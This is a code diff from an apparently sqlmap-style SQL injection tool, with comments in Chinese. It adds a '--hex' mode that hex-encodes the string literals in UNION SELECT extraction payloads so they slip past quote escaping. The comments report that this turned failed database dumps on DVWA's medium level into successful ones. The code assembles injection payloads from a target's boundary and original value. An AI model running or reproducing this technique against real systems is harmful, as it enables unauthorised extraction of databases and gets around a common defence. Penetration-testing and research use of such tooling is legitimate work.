@@ -21,7 +21,7 @@ import {
 } from './DialectSqlBuilder.js';
 import { logger } from '../core/logger.js';
 // [对标 sqlmap --hex] 字符串字面量十六进制化（仅已验证方言，其余显式报错）
-import { buildLikePattern, hexifyLikeInQuery } from './hexLiteral.js';
+import { buildLikePattern, hexifyLikeInQuery, hexifyStringLiterals } from './hexLiteral.js';
 // [对标 sqlmap --common-tables/--common-columns] 字典（information_schema 不可用时的枚举出路）
 import { COMMON_TABLES, COMMON_COLUMNS, NONEXISTENT_PROBE } from './commonNames.js';
 // [P0-FIX] 提取路径放大响应上限：防大表拖库被 5MB 默认上限截断
@@ -43,6 +43,31 @@ import {
 // fromDummy/WRAP）统一从 DialectSqlBuilder.js 导入，消除 4 份 resolveDbms 拷贝、2 份
 // fromDummy 拷贝、2 份转义函数拷贝。re-export WRAP 保持向后兼容（dbmsExtend.test 等）。
 export { WRAP };
+
+/**
+ * [D301 GAP①] --hex 提取链：把组装完成的 UNION payload 里的引擎自有字符串字面量
+ * （`'__S__'`/`'__E__'` 标记、`SEPARATOR ','`、`WHERE table_schema='…'` 等）整体
+ * 十六进制化。为什么需要：real_escape_string 全站逃逸的目标（DVWA sqli medium 形态）
+ * 会把带引号标记全部转义致死 ⇒ 拖库静默全空——hexify 后 payload 不含任何引号，转义
+ * 无从作用（真机实证：DVWA medium 拖库从 0/5 → 5/5，见 all-levels-verify）。
+ * 抽成模块级纯函数的原因：extractScalar 在复杂度基线里（19 行/17 圈，只许持平），
+ * 分支放这里（新函数远低于上限），基线函数零变化。
+ * 降级口径与搜索路径一致：方言不支持/无可转换字面量 ⇒ warn 后保持普通形态（不产出
+ * 错误 SQL，也不静默假装生效——普通形态在逃逸目标上会诚实空结果）。
+ * @param {string} payload 组装完成的 UNION payload
+ * @param {string} edb resolveDbms() 后的方言名
+ * @param {object|undefined} config 扫描配置（config.hex === true 才生效）
+ * @returns {string} 可能被十六进制化的 payload
+ */
+function hexifyExtractPayload(payload, edb, config) {
+  if (config?.hex !== true) return payload;
+  try {
+    return hexifyStringLiterals(payload, edb);
+  } catch (e) {
+    logger.warn(`[extract] --hex 未生效（${e.message}）——本次提取保持普通形态（全站转义目标上会诚实空结果）`);
+    return payload;
+  }
+}
 
 // [P2] 方言查询/函数映射表已拆分到 extractionMaps.js（消除 430 行常量定义）
 import {
@@ -277,7 +302,7 @@ export class Extractor {
     // ★FIX-4 [P1] 原 payload 未拼 point.boundary（布尔/时间检测器均使用），字符串上下文
     // 注入点（如 WHERE name='...'）上 UNION 提取永不执行。修复：拼闭合前缀。
     const payload = `${point.originalValue || '1'}${point.boundary || ''} UNION SELECT ${cols}${fromDual}-- -`;
-    return this._markedValue(ctx, payload);
+    return this._markedValue(ctx, hexifyExtractPayload(payload, resolveDbms(dbms), ctx.config));
   }
 
   /**
